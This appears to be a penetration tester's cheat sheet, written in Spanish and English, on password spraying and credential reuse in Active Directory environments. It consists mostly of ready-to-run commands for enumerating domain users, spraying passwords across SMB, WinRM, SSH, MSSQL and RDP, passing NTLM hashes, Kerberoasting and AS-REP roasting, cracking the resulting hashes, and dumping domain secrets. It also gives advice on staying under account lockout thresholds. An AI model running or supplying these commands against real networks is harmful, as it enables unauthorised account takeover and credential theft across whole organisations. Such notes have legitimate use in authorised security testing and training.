---
title: Password spray y credential reuse
slug: password-spray
category: techniques
updated: 2026-06-30
summary: "Spray + credential reuse, Kerberoast/AS-REP/PTH, lockout notes"
tags: [password-spray, netexec, kerberoast, pth, ad, credentials]
sensitive: false
---

# Password spray y credential reuse

## When to use
Cada hash/password nuevo obtenido en pillaging → probar inmediatamente en toda la subred y todos los protocolos. Una machine account (`SRV01$`) es cuenta de dominio válida para enumerar y spray.

## Preparar listas de usuarios
```bash
nxc smb DC_IP -u USER -p PASS --users | awk '{print $5}' > users.txt
nxc smb DC_IP -u "" -p "" --rid-brute 2>/dev/null | grep SidTypeUser | awk '{print $6}' | cut -d'\' -f2 > users.txt
impacket-lookupsid anonymous@DC_IP | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
# Machine account hash sirve igual:
nxc smb DC_IP -u 'SRV01$' -H NTHASH --users | awk '{print $5}' > users.txt
sort -u users.txt -o users.txt; sed 's/DOMAIN\\//g' users.txt > users_clean.txt
```
Fuentes de passwords: pillaging (xlsx/configs), rockyou, seclists, CeWL (`cewl http://T -d 3 -m 5 -w out.txt`), patrones (`Summer2024!`, `Welcome1`, `CompanyName123`).

## netexec (nxc) — spray por protocolo
```bash
nxc smb DC_IP -u users.txt -p passwords.txt --no-bruteforce
nxc smb RANGE -u users.txt -p 'Password1' --continue-on-success 2>/dev/null | grep '+'
nxc smb RANGE -u Administrator -H HASH --local-auth        # PTH local
nxc smb RANGE -u Administrator -H HASH                      # PTH dominio
nxc winrm  T -u U -p P     ;  nxc ssh   T -u U -p P
nxc mssql  T -u U -p P     ;  nxc rdp   T -u U -p P --screenshot
nxc ftp    T -u anonymous -p ""
nxc ldap DC_IP -u U -p P --password-not-required
```

## Impacket — roast & PTH
```bash
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerb.txt
hashcat -m 18200 asrep.txt rockyou.txt ; hashcat -m 13100 kerb.txt rockyou.txt
impacket-psexec    -hashes :NTHASH DOMAIN/Administrator@TARGET
impacket-secretsdump -hashes :NTHASH DOMAIN/Administrator@DC_IP
# Cross-forest Kerberoast (por trust) — necesita RUTA de red, no solo el trust
impacket-GetUserSPNs DOMAIN/Administrator -hashes :NTHASH \
  -target-domain mgmt.EXTERNAL.local -dc-ip TARGET_DC_IP -request
```

## Hydra (no-Windows) y Kerbrute
```bash
hydra -L users.txt -P passwords.txt ssh://TARGET
hydra -L users.txt -P passwords.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -P passwords.txt -s 7778 ssh://127.0.0.1   # via SOCKS
kerbrute userenum --dc DC_IP -d DOMAIN users.txt -o valid_users.txt
kerbrute passwordspray --dc DC_IP -d DOMAIN users.txt 'Password1'
```

## Workflow post-pillaging
```bash
RANGE=172.16.1.0/24; U=user; P='pass'
for proto in smb winrm ssh mssql ftp rdp; do
  nxc $proto $RANGE -u $U -p "$P" --continue-on-success 2>/dev/null | grep '+'; done
# Hash nuevo → PTH en toda la subred (local + dominio)
nxc smb $RANGE -u Administrator -H HASH --local-auth 2>/dev/null | grep '+'
nxc smb $RANGE -u Administrator -H HASH 2>/dev/null | grep '+'
```

## Gotchas
- Lockout AD típico: 5 intentos / 30 min → estrategia "una password, todos los usuarios". Verifica con `nxc smb DC_IP -u U -p P --pass-pol`.
- `--continue-on-success` imprescindible en spray masivo; filtra hits con `grep '+'`.
- Cross-forest: `-target-domain` da "name resolution failure" hasta tener ruta (Ligolo dual-NIC en host con doble NIC).
- Una credencial reutilizada no abre TODO: probar cada servicio por separado.
- PTH WinRM: usa `evil-winrm -i T -u U -H H`.

## References
- Relacionado: [[netexec-crackmapexec]], [[active-directory-attacks]], [[password-cracking]], [[service-enumeration]]
- 02_PASSWORD_SPRAY.md
